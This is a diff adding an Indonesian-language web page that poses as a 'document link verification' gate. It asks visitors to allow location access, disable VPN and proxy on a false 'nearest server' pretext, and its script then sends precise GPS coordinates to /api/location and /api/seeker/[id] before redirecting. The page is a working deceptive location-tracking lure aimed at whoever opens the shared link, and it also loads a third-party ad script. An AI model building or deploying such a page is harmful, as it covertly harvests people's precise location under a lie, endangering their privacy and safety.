@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verifikasi Link</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    button, input {
+      padding: 10px;
+      font-size: 16px;
+      margin: 5px;
+    }
+    button {
+      background: #000;
+      color: white;
+      border-radius: 8px;
+      border: none; 
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Verifikasi Akses Dokumen</h2>
+  <p>Izinkan lokasi untuk mengakses dokumen. Agar dirutekan ke Server terdekat</p>
+  <p>Mohon untuk mematikan VPN, Proxy, dan Hemat Daya.</p>
+  <p>Mohon dimaklumi tentang <strong>Iklannya</strong> karena <strong>Gratis</strong></p>
+  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg" width="200"> <br><br>
+
+  <!-- Audio dari GitHub (dimulai dengan muted agar bisa autoplay) -->
+  <audio id="audio" src="https://github.com/mukti-nux/Framer-asset/raw/refs/heads/main/DJ%20Trap%20Cecilion%20Bass%20Panjang%20-%20Jingle%20Cah%20Kulonan%20Yang%20Sering%20diputar%20Sinar%20Music.mp3" muted autoplay preload="auto"></audio>
+
+  <button onclick="submitData()">Dapatkan Link</button><br>
+  <br><br>
+
+  <h5>Request Musik 2k/hari*. S&K berlaku</h5>
+
+  <a href="https://www.instagram.com/hasanabdulloh_1/?hl=en" target="_blank" rel="noopener noreffer">
+    <img src="https://github.com/mukti-nux/Framer-asset/blob/main/logo_ig-removebg-preview.png?raw=true" alt="Instagram" width="75px" />
+  </a><br>
+
+  <span class="block text-gray-500 dark:text-gray-400"
+    >Support Me<a href="https://trakteer.id/hasan_mukti_abdulloh/" class="font-semibold text-gray-600 dark:text-white" target="_blank">🔗Trakteer</a>
+  </span>
+
+  <h5>©Admin</h5>
+
+  <script src="https://fpyf8.com/88/tag.min.js" data-zone="154189" async data-cfasync="false"></script>
+
+  <script>
+  const id = new URLSearchParams(window.location.search).get("id");
+  const audio = document.getElementById('audio');
+  let lastSubmitTime = 0;
+
+  function startAudioOnce() {
+    audio.muted = false;
+    audio.play().catch(err => console.warn("Audio gagal diputar:", err));
+    document.removeEventListener('click', startAudioOnce);
+    document.removeEventListener('touchstart', startAudioOnce);
+  }
+  document.addEventListener('click', startAudioOnce);
+  document.addEventListener('touchstart', startAudioOnce);
+
+  function submitData() {
+    const now = Date.now();
+    const selisih = Math.floor((now - lastSubmitTime) / 1000);
+    if (selisih < 30) {
+      alert(`Harap tunggu ${30 - selisih} detik sebelum mencoba lagi.`);
+      return;
+    }
+
+    if (!id) return alert("ID dokumen tidak ditemukan.");
+    lastSubmitTime = now;
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const body = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy,
+            timestamp: new Date().toISOString()
+          };
+
+          // Kirim ke /api/location
+          fetch("/api/location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body),
+          }).catch((e) => console.warn("Lokasi gagal dikirim:", e));
+
+          // Kirim ke /api/seeker/[id]
+          fetch(`/api/seeker/${id}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body),
+          })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.redirectTo) {
+              localStorage.setItem("tujuanAkhir", data.redirectTo);
+              window.location.href = "/intermediate.html";
+            } else {
+              alert("Link tidak ditemukan.");
+            }
+          });
+        },
+        (err) => alert("Izin lokasi diperlukan. Aktifkan GPS dan izinkan akses."),
+        { enableHighAccuracy: true, timeout: 30000 }
+      );
+    } else {
+      alert("Browser tidak mendukung geolokasi.");
+    }
+  }
+  </script>
+</body>
+</html>
